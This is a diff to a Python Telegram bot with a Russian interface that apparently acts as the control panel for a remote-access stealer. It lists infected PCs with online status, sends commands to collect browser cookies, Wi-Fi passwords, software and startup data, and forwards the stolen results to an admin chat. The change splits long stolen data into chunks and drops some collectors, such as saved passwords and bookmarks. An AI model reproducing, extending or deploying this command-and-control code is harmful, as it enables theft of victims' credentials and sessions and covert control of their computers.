@@ -224,12 +224,8 @@ def get_files_menu(device_id):
 
 def get_data_menu(device_id):
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🍪 Cookies браузеров", callback_data=f"cmd_cookies_{device_id}")],
-        [InlineKeyboardButton(text="🔑 Сохраненные пароли", callback_data=f"cmd_passwords_{device_id}")],
+        [InlineKeyboardButton(text="🍪 Куки всех браузеров", callback_data=f"cmd_cookies_{device_id}")],
         [InlineKeyboardButton(text="📶 Wi-Fi пароли", callback_data=f"cmd_wifi_{device_id}")],
-        [InlineKeyboardButton(text="🧩 Расширения Chrome", callback_data=f"cmd_extensions_{device_id}")],
-        [InlineKeyboardButton(text="🔖 Закладки", callback_data=f"cmd_bookmarks_{device_id}")],
-        [InlineKeyboardButton(text="📥 История загрузок", callback_data=f"cmd_downloads_{device_id}")],
         [InlineKeyboardButton(text="📦 Установленное ПО", callback_data=f"cmd_software_{device_id}")],
         [InlineKeyboardButton(text="🚀 Автозагрузка", callback_data=f"cmd_startup_{device_id}")],
         [InlineKeyboardButton(text="⚙️ Системные службы", callback_data=f"cmd_services_{device_id}")],
@@ -271,10 +267,22 @@ async def show_devices_callback(callback: types.CallbackQuery):
     keyboard = []
     current_time = int(time.time())
     
+    # Подсчитываем количество устройств с одинаковыми именами
+    name_count = {}
+    for dev_id, name, last_seen, ip, os_info, first_seen in devices:
+        name_count[name] = name_count.get(name, 0) + 1
+    
     for dev_id, name, last_seen, ip, os_info, first_seen in devices:
         status_emoji = "🟢" if current_time - last_seen < 180 else "🔴"
         status_text = "Онлайн" if current_time - last_seen < 180 else "Оффлайн"
-        btn_text = f"{status_emoji} {name} ({status_text})"
+        
+        # Если есть несколько устройств с одинаковым именем, добавляем ID
+        if name_count[name] > 1:
+            display_name = f"{name} ({dev_id[:8]})"
+        else:
+            display_name = name
+        
+        btn_text = f"{status_emoji} {display_name} ({status_text})"
         keyboard.append([InlineKeyboardButton(text=btn_text, callback_data=f"manage_{dev_id}")])
     
     keyboard.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="go_to_main_start")])
@@ -346,11 +354,11 @@ async def manage_device(callback: types.CallbackQuery):
     
     text = f"💻 **Управление ПК:**\n"
     text += f"• Имя: `{name}`\n"
+    text += f"• ID: `{device_id}`\n"
     text += f"• Статус: {status_str}\n"
     text += f"• IP: `{ip or 'Неизвестно'}`\n"
     text += f"• ОС: `{os_info or 'Неизвестно'}`\n"
-    text += f"• В системе: {uptime}\n"
-    text += f"• ID: `{device_id}`"
+    text += f"• В системе: {uptime}"
     
     markup = get_device_menu(device_id, name)
     
@@ -466,11 +474,7 @@ async def send_command(callback: types.CallbackQuery):
         "ports": "ports",
         # Сбор данных
         "cookies": "cookies",
-        "passwords": "passwords",
         "wifi": "wifi",
-        "extensions": "extensions",
-        "bookmarks": "bookmarks",
-        "downloads": "downloads",
         "software": "software",
         "startup": "startup",
         "services": "services",
@@ -491,7 +495,6 @@ async def send_command(callback: types.CallbackQuery):
         await callback.answer(f"❌ Ошибка отправки: {str(e)[:50]}")
 
 # --- ПРИЕМ ДАННЫХ ИЗ КАНАЛА ---
-# (остается без изменений из предыдущей версии)
 
 @dp.channel_post(F.text)
 async def handle_channel_messages(message: types.Message):
@@ -708,8 +711,15 @@ async def handle_channel_messages(message: types.Message):
             markup = get_device_menu(device_id) if device_id else None
             
             # Проверяем, является ли это ответом на команду сбора данных
-            if any(key in text_data for key in ["Cookies", "пароли", "Wi-Fi", "Расширения", "Закладки", "загрузок", "ПО", "Автозагрузка", "Службы", "События"]):
-                await bot.send_message(chat_id=ADMIN_ID, text=text_data, parse_mode="Markdown", reply_markup=markup)
+            if any(key in text_data for key in ["Wi-Fi", "ПО", "Автозагрузка", "Службы", "События", "Куки"]):
+                if len(text_data) > 4000:
+                    for i in range(0, len(text_data), 4000):
+                        chunk = text_data[i:i+4000]
+                        await bot.send_message(chat_id=ADMIN_ID, text=chunk, parse_mode="Markdown", 
+                                              reply_markup=markup if i == 0 else None)
+                else:
+                    await bot.send_message(chat_id=ADMIN_ID, text=text_data, parse_mode="Markdown", 
+                                          reply_markup=markup)
                 await message.delete()
                 return
             
@@ -730,7 +740,7 @@ async def handle_channel_messages(message: types.Message):
                     except:
                         pass
             
-            if any(key in text_data for key in ["Информация о системе", "Сетевая информация", "Батарея", "Процессы"]):
+            if any(key in text_data for key in ["Информация о системе", "Сетевая информация", "Батарея", "Процессы", "дисках", "адаптеры", "переменные"]):
                 await bot.send_message(chat_id=ADMIN_ID, text=text_data, parse_mode="Markdown", reply_markup=markup)
             else:
                 if len(text_data) > 4000:
